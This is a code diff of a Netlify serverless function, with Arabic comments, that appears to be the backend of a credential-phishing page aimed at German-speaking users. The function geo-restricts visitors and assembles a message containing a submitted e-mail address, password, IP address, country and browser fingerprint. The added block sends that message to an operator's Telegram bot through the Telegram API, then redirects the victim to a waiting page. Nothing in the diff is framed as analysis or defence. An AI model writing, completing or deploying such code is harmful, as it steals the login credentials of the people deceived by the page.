@@ -28,15 +28,13 @@ exports.handler = async (event, context) => {
     }
 
     const ip = getClientIp(event.headers); 
-    const countryCode = event.headers['x-nf-client-country'] || 'غير متوفر'; // جلب رمز البلد
+    const countryCode = event.headers['x-nf-client-country'] || 'غير متوفر'; 
 
     // ----------------------------------------------------------------
     // 1. تقييد الوصول الجغرافي (Geo-Restriction Check)
     // ----------------------------------------------------------------
     if (!ALLOWED_COUNTRIES.includes(countryCode)) {
         console.log(`[BLOCKED GEO] Access denied from Country: ${countryCode} (IP: ${ip})`);
-        
-        // التحويل إلى صفحة الانتظار أو تسجيل الدخول لمنع الاستخدام
         return {
             statusCode: 303,
             headers: {
@@ -107,17 +105,37 @@ exports.handler = async (event, context) => {
     message_text += `E\\-Mail: \`${safe_email}\`\n`;
     message_text += `Passwort: \`${safe_password}\`\n`;
     message_text += `IP: \`${safe_ip}\`\n`;
-    message_text += `Country: \`${safe_country}\`\n\n`; // <--- تم إضافة البلد
+    message_text += `Country: \`${safe_country}\`\n\n`;
     message_text += `*FP Details:*\n`;
     message_text += `${fpDetails}`;
 
-    // ... (منطق إرسال Telegram) ...
-
+    // ----------------------------------------------------------------
+    // 5. إرسال البيانات إلى Telegram (الكتلة المفقودة/المصححة)
+    // ----------------------------------------------------------------
     const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
     const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
     
-    // ... (كود إرسال Telegram) ...
-
+    if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID) {
+        const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+        const data = {
+            chat_id: TELEGRAM_CHAT_ID,
+            text: message_text,
+            parse_mode: 'MarkdownV2',
+        };
+        try {
+            await fetch(TELEGRAM_API_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data)
+            });
+        } catch (error) {
+            console.error("Error sending message to Telegram:", error);
+        }
+    } else {
+         console.error("Telegram API credentials are NOT set up for sending.");
+    }
+    
+    // التحويل إلى صفحة الانتظار
     return {
         statusCode: 303,
         headers: {
